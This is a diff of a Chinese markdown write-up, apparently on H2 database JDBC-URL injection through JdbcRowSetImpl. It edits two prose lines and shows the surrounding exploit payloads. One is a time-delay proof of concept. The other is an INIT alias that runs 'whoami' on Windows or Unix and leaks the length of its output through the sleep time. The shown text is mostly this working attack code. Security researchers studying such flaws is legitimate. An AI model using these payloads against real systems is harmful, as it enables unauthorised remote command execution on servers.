@@ -292,7 +292,7 @@ public class FrH2 {
 
 ## 远程 RCE
 
-先让目标睡 3 秒。`JdbcRowSetImpl` 的 url 是：
+先让目标睡 3 秒。`JdbcRowSetImpl` 的 url 是
 
 ```text
 jdbc:h2:mem:s1;INIT=CREATE ALIAS SLEEP FOR "java.lang.Thread.sleep"\;CALL SLEEP(3000)
@@ -370,7 +370,7 @@ void e() throws Exception {
 }
 ```
 
-JDBC 字符串如下
+URL 如下
 
 ```text
 jdbc:h2:mem:w1;INIT=CREATE ALIAS E AS 'void e() throws Exception { String[] c=System.getProperty("os.name").toLowerCase().indexOf("win")>=0?new String[]{"cmd.exe","/c","whoami"}:new String[]{"/bin/sh","-c","whoami"}\; java.io.InputStream in=java.lang.Runtime.getRuntime().exec(c).getInputStream()\; java.io.ByteArrayOutputStream bo=new java.io.ByteArrayOutputStream()\; byte[] b=new byte[64]\; int n\; while((n=in.read(b))>0) bo.write(b,0,n)\; int len=new String(bo.toByteArray(),"UTF-8").trim().length()\; java.lang.Thread.sleep(3000L+500L*(long)len)\; }'\;CALL E()
